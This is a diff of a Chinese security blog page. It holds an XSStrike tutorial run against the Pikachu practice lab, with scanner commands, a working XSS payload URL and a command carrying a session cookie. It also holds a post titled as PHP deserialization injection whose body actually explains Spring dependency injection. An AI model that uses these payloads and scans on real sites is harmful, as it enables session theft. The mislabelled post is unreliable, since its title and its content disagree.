+<p>这是最简单的，我们先手动submit一下看看url</p>
+<p><img src="/.com//image-20250520023402-255gf3e.png" alt="image"></p>
+<p>直接写payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=k123&amp;submit=submit&quot;</span> --skip --skip-dom</span><br></pre></td></tr></table></figure>
+
+<p>这就是根据刚刚的基本命令写的，最后两个参数就是跳过确认提示和跳过dom型扫描，因为已经说了是反射型了</p>
+<p><img src="/.com//image-20250520023415-vfrekc7.png" alt="image">​</p>
+<p>因为这个是最简单的xss所以有很多的payload，列出的payload都是成功的</p>
+<p>比如第一个(注意payload包括括号)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/pikachu-master/vul/xss/xss_reflected_get.php?message=%3CdEtaIls/+/ontoggLE+=+[8].find(confirm)%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250520023440-tiuzgl6.png" alt="image"></p>
+<p>点击详细信息就会弹窗（safari浏览器弹不了，只能用谷歌）</p>
+<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><hr>
+<p>这个是需要登陆的，所以需要拿cookie</p>
+<p><img src="/.com//image-20250520023454-xfhhd3j.png" alt="image"></p>
+<p>这里传的参是通过post传的，所以还需要拿post</p>
+<p>获取post可以抓包获取，也可以直接看请求</p>
+<p><img src="/.com//image-20250520023501-fcokexp.png" alt="image"></p>
+<p>点一下view source看完整的</p>
+<p><img src="/.com//image-20250520023508-ywgokzv.png" alt="image"></p>
+<p>这就是post请求了，然后再找cookie</p>
+<p><img src="/.com//image-20250520023515-lv1zzz7.png" alt="image"></p>
+<p>可以在控制台输入document.cookie来获取cookie</p>
+<p>现在有了post请求和cookie就可以使用软件了</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xsspost/xss_reflected_post.php&quot;</span> --data <span class="string">&quot;message=1&amp;submit=submit&quot;</span> --headers <span class="string">&quot;Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ik287bd9bniuabdun1psescmr3&quot;</span></span><br></pre></td></tr></table></figure></blockquote>
+<p>要注意格式，需要自己添加Cookie:然后这后面又个空格</p>
+<p><img src="/.com//image-20250520023535-u7joe1g.png" alt="image"></p>
+<p>用第一个payload试一试</p>
+<p><img src="/.com//image-20250520023542-25jl455.png" alt="image"></p>
+<p>配合hackbar发送</p>
+<p><img src="/.com//image-20250520023550-3xuog8w.png" alt="image"><img src="/.com//image-20250520023553-0kxick2.png" alt="image"></p>
+<p>鼠标移动上去就弹窗</p>
+<hr>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/.com//image-20250520023610-8smbq12.png" alt="image"></p>
+<p>这也是post发送的</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_stored.php&quot;</span> <span class="params">--data</span> <span class="string">&quot;message=1&amp;submit=submit&quot;</span> <span class="params">--skip-dom</span> <span class="params">--skip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250520023623-pjrutwo.png" alt="image"></p>
+<p>因为这是存储的，所以它测试的时候会不断传进去，及时按ctrl+c停止</p>
+<p><img src="/.com//image-20250520023631-8diah4y.png" alt="image"><img src="/.com//image-20250520023634-zrbz4a5.png" alt="image"></p>
+<hr>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>这个用XSStrike做不出来，如果有人可以做出来欢迎补充</p>
+<hr>
+<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="/.com//image-20250520023650-yn41p64.png" alt="image"></p>
+<p>通过get传参并且有回显，直接跑</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> xsstrike.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_01.php?message=13&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250520023703-qk66wlr.png" alt="image"></p>
+<p><img src="/.com//image-20250520023714-ujyvkd4.png" alt="image"><img src="/.com//image-20250520023717-tqnkd4v.png" alt="image"></p>
+<hr>
+<h2 id="XSS之HTML特殊字符"><a href="#XSS之HTML特殊字符" class="headerlink" title="XSS之HTML特殊字符"></a>XSS之HTML特殊字符</h2><p>这题用工具跑出来的payload用不了，会被转义</p>
+<p>还是手动好</p>
+<hr>
+<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/.com//image-20250520023740-4kqh3ql.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_03.php?message=123&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250520023750-d85dkno.png" alt="image"></p>
+<p><img src="/.com//image-20250520023753-b9ptlcx.png" alt="image"></p>
+<hr>
+<h2 id="XSS之href输出-1"><a href="#XSS之href输出-1" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>这题也不能靠工具</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" data-id="cmawcfxa0003ucg7k4yez0ooz" data-title="XSStrike实战教程" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/反序列化/反序列化详解/对象注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/">反序列化对象注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><h3 id="一，实现方式的使用"><a href="#一，实现方式的使用" class="headerlink" title="一，实现方式的使用"></a>一，实现方式的使用</h3><p>对象注入也可被称为对象装配，是把Bean对象获取出来放到某个类中。</p>
+<p>对象注入的实现方式有3种，分别为<strong>属性注入</strong>，<strong>Setter注入</strong>和<strong>构造方法注入</strong>。</p>
+<p>为了更好地理解对象注入的实现方式，搞个实例来具体说明：</p>
+<h4 id="1-0，前期准备"><a href="#1-0，前期准备" class="headerlink" title="1.0，前期准备"></a>1.0，前期准备</h4><p><strong>1，准备Service类</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class StudentService &#123;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student service sayHi()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>示例问题：将 Service 类注入到 Controller 类中，对象注入实现：</p>
+<h4 id="1-1，属性注入"><a href="#1-1，属性注入" class="headerlink" title="1.1，属性注入"></a>1.1，属性注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    //注入方式：属性注入</span><br><span class="line">    @Autowired</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3，启动类执行结果：</strong></p>
+<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
+<h4 id="1-2，Setter注入"><a href="#1-2，Setter注入" class="headerlink" title="1.2，Setter注入"></a>1.2，Setter注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public void setStudentService(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2，启动类实现代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3，启动类执行结果：</strong></p>
+<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
+<h4 id="1-3，构造方法注入"><a href="#1-3，构造方法注入" class="headerlink" title="1.3，构造方法注入"></a>1.3，构造方法注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public StudentController(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2，启动类实现代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3，启动类执行结果：</strong></p>
+<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
+<hr>
+<h3 id="二，方式的优缺点分析"><a href="#二，方式的优缺点分析" class="headerlink" title="二，方式的优缺点分析"></a>二，方式的优缺点分析</h3><h4 id="2-1，属性注入"><a href="#2-1，属性注入" class="headerlink" title="2.1，属性注入"></a>2.1，属性注入</h4><p><strong>1，方式实现代码：</strong></p>
+<p><img src="/.com//image-20250519113909-9naesmp.png" alt="image"></p>
+<p><strong>2，方式优点：</strong></p>
+<ul>
+<li>实现简单，易于理解和维护</li>
+</ul>
+<p><strong>3，方式缺点：</strong></p>
+<ul>
+<li>不能注入不可变对象【final 修饰的变量】</li>
+<li>通用性差，只适用于IoC容器，在非IoC框架中无效</li>
+<li>更容易违背单一设计原则</li>
+</ul>
+<h4 id="2-2，Setter注入"><a href="#2-2，Setter注入" class="headerlink" title="2.2，Setter注入"></a>2.2，Setter注入</h4><p><strong>1，方式实现代码：</strong></p>
+<p><img src="/.com//image-20250519114004-n40tgzk.png" alt="image"></p>
+<p><strong>2，方式优点：</strong></p>
+<ul>
+<li>符合单一设计原则【每个方法只传递一个对象】</li>
+</ul>
+<p><strong>3，方式缺点：</strong></p>
+<ul>
+<li>不能注入不可变对象【final 修饰的变量】</li>
+<li>使用Setter注入的对象可能被修改</li>
+</ul>
+<h4 id="2-3，构造方法注入"><a href="#2-3，构造方法注入" class="headerlink" title="2.3，构造方法注入"></a>2.3，构造方法注入</h4><p><strong>1，方式实现代码：</strong></p>
+<p><img src="/.com//image-20250519114010-b66tqw9.png" alt="image"></p>
+<p>注意：如果只有一个构造方法，那么 @Autowired 注解可以省略。</p>
+<p><strong>2，方式优点：</strong></p>
+<p>可以注入不可变对象【final 修饰的变量】</p>
+<p>注入对象不会被改变【构造方法只执行一次】</p>
+<p>注入对象会完全被初始化</p>
+<p>通用性更好，可在IoC容器中使用，也可在非IoC中使用</p>
+<p><strong>3，方式缺点：</strong></p>
+<p>不符合单一设计原则【每个方法可传递多个对象】</p>
+<hr>
+<h3 id="三，对象注入中的问题"><a href="#三，对象注入中的问题" class="headerlink" title="三，对象注入中的问题"></a>三，对象注入中的问题</h3><h4 id="3-1，-Autowired-和-Resource"><a href="#3-1，-Autowired-和-Resource" class="headerlink" title="3.1，@Autowired 和 @Resource"></a>3.1，@Autowired 和 @Resource</h4><p>在进行类注入时，除了可以使用<code>@Autowired</code>​注解之外，我们还可以使用<code>@Resource</code>​注解进行注入。</p>
+<p><img src="/.com//image-20250519114041-uhz25b2.png" alt="image"></p>
+<p>​<code>@Autowired</code>​ 和 <code>@Resource</code>​ 都是在 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Spring%20%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">Spring 框架</a>中用于注入依赖的注解，它们有以下区别：</p>
+<ol>
+<li><p><strong>来源不同：</strong></p>
+<ul>
+<li>​<code>@Autowired</code>​ 是 Spring 框架提供的注解，通过类型进行依赖注入。</li>
+<li>​<code>@Resource</code>​ 是 JavaEE 定义的注解，通过名称进行依赖注入。</li>
+</ul>
+</li>
+<li><p><strong>注入方式不同：</strong></p>
+<ul>
+<li>​<code>@Autowired</code>​ 默认按照类型匹配的方式进行注入，如果存在多个相同类型的实例，可以结合 <code>@Qualifier</code>​ 注解来指定具体实例。</li>
+<li>​<code>@Resource</code>​ 默认按照名称匹配的方式进行注入，它支持使用 <code>name</code>​ 或 <code>type</code>​ 属性来指定名称或类型进行匹配。</li>
+</ul>
+</li>
+<li><p><strong>支持的类型不同：</strong></p>
+<ul>
+<li>​<code>@Autowired</code>​ 支持通过构造方法注入、属性注入、Setter 注入的方式实现依赖注入。</li>
+<li>​<code>@Resource</code>​ 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入。</li>
+</ul>
+</li>
+<li><p><strong>应用范围不同：</strong></p>
+<ul>
+<li>​<code>@Autowired</code>​ 主要用于 Spring 框架中的组件（如 Spring Bean）的依赖注入。</li>
+<li>​<code>@Resource</code>​ 是 JavaEE 规范中的注解，它可以用于依赖注入和资源的获取，对于不依赖于 Spring 框架的应用也可以使用。</li>
+</ul>
+</li>
+</ol>
+<h4 id="3-2，同⼀类型多个-Bean-报错"><a href="#3-2，同⼀类型多个-Bean-报错" class="headerlink" title="3.2，同⼀类型多个 @Bean 报错"></a>3.2，同⼀类型多个 @Bean 报错</h4><p>当出现多个 Bean 返回同⼀对象类型时，程序会报错。解决同一个类型，多个bean的解决方案有以下两个：</p>
+<p><strong>1，使用</strong>  <strong>​<code>@Resource(name=&quot;&quot;)</code>​</strong> ​</p>
+<p><img src="/.com//image-20250519114126-lew7r0p.png" alt="image"></p>
+<p><strong>2，搭配</strong>  <strong>​<code>@Autowired</code>​</strong>​ <strong>使用</strong>  <strong>​<code>@Qualifierr(value = &quot;&quot;)</code>​</strong> ​</p>
+<p><img src="/.com//image-20250519114131-ekqswo4.png" alt="image"></p>
+<p>核心总结<br>1，三种对象注入的实现方式以及优缺点？<br>属性注入，Setter注入和构造方法注入是在依赖注入中常用的三种方式，它们各有优缺点：</p>
+<p>1，属性注入方式：其实现简单，易于理解和维护，但是其不能注入不可变对象，只适用于IoC容器，并且违反单一设计原则的概率大。</p>
+<p>2，Setter注入方式：其符合单一设计原则，但是其不能注入不可变对象，并且使用Setter注入的对象可能被修改。</p>
+<p>3，构造方法注入方式：其可以注入不可变对象，注入的对象不能被改变，保证注入对象完全被初始化，并且具有通用性，但是其不符合单一设计原则。</p>
+<p>注意：在上述的三种对象注入的实现方式中，构造方法注入是Spring推荐的注入方式。</p>
+<hr>
+<p><strong>思考：为什么构造方法可以注入不可变变量，而属性注入和Setter注入却不行呢？</strong></p>
+<p>解答：在 Java 中，被<code>final</code>​修饰的对象，要么直接进行赋值，要么就在构造方法中进行赋值，两种情况必须满足一个，否则方式报错。</p>
+<hr>
+<p>2，@Autowired 和 @Resource 注入注解的区别？<br>@Autowired 和 @Resource 都是在 Spring 框架中用于注入依赖的注解，它们有以下区别：</p>
+<p>1，来源不同：@Autowired 是 Spring 框架提供的注解，而@Resource 是 JavaEE 定义的注解。</p>
+<p>2，注入方式不同：@Autowired 默认按照类型匹配的方式进行注入，而@Resource 默认按照名称匹配的方式进行注入。</p>
+<p>3，支持的类型不同：@Resource 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入，而@Autowired 支持。</p>
+<p>4，应用范围不同：@Autowired 主要用于 Spring 框架中的组件的依赖注入，而@Resource对于不依赖于 Spring 框架的应用也可使用。</p>
+<hr>
+<h4 id="3，同⼀类型多个-Bean-报错的解决方案有哪些？"><a href="#3，同⼀类型多个-Bean-报错的解决方案有哪些？" class="headerlink" title="3，同⼀类型多个 @Bean 报错的解决方案有哪些？"></a>3，同⼀类型多个 @Bean 报错的解决方案有哪些？</h4><p>解决同一个类型 @Bean 报错的解决方案有以下两个：</p>
+<ol>
+<li>使用 <code>@Resource(name=&quot;&quot;)</code>​</li>
+<li>使用 <code>@Qualifierr(value = &quot;&quot;)</code>​ 【搭配@Autowired使用】</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" data-id="cmawcfxa40043cg7kd58wag1i" data-title="反序列化对象注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li></ul>
 
     </footer>
   </div>
@@ -1446,126 +1561,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/" data-id="cmawb0xv70013747kb08faet0" data-title="反序列化题目练习" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/" data-id="cmawcfxa50045cg7kcpho0oyl" data-title="反序列化题目练习" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用/xsstrike/使用教程/实战" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/">XSStrike实战教程</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="XSStrike的基本使用"><a href="#XSStrike的基本使用" class="headerlink" title="XSStrike的基本使用"></a>XSStrike的基本使用</h1><p>下面是他的常用命令</p>
-<ul>
-<li>-u url</li>
-<li>–skip 跳过确认提示</li>
-<li>–skip-dom 跳过dom型扫描</li>
-<li>–data post型时的数据</li>
-</ul>
-<p>这里我们使用pikachu平台进行测试</p>
-<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p><img src="/.com//image-20250520023352-uo3hi74.png" alt="image"></p>
-<p>这是最简单的，我们先手动submit一下看看url</p>
-<p><img src="/.com//image-20250520023402-255gf3e.png" alt="image"></p>
-<p>直接写payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=k123&amp;submit=submit&quot;</span> --skip --skip-dom</span><br></pre></td></tr></table></figure>
-
-<p>这就是根据刚刚的基本命令写的，最后两个参数就是跳过确认提示和跳过dom型扫描，因为已经说了是反射型了</p>
-<p><img src="/.com//image-20250520023415-vfrekc7.png" alt="image">​</p>
-<p>因为这个是最简单的xss所以有很多的payload，列出的payload都是成功的</p>
-<p>比如第一个(注意payload包括括号)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/pikachu-master/vul/xss/xss_reflected_get.php?message=%3CdEtaIls/+/ontoggLE+=+[8].find(confirm)%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250520023440-tiuzgl6.png" alt="image"></p>
-<p>点击详细信息就会弹窗（safari浏览器弹不了，只能用谷歌）</p>
-<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><hr>
-<p>这个是需要登陆的，所以需要拿cookie</p>
-<p><img src="/.com//image-20250520023454-xfhhd3j.png" alt="image"></p>
-<p>这里传的参是通过post传的，所以还需要拿post</p>
-<p>获取post可以抓包获取，也可以直接看请求</p>
-<p><img src="/.com//image-20250520023501-fcokexp.png" alt="image"></p>
-<p>点一下view source看完整的</p>
-<p><img src="/.com//image-20250520023508-ywgokzv.png" alt="image"></p>
-<p>这就是post请求了，然后再找cookie</p>
-<p><img src="/.com//image-20250520023515-lv1zzz7.png" alt="image"></p>
-<p>可以在控制台输入document.cookie来获取cookie</p>
-<p>现在有了post请求和cookie就可以使用软件了</p>
-<blockquote>
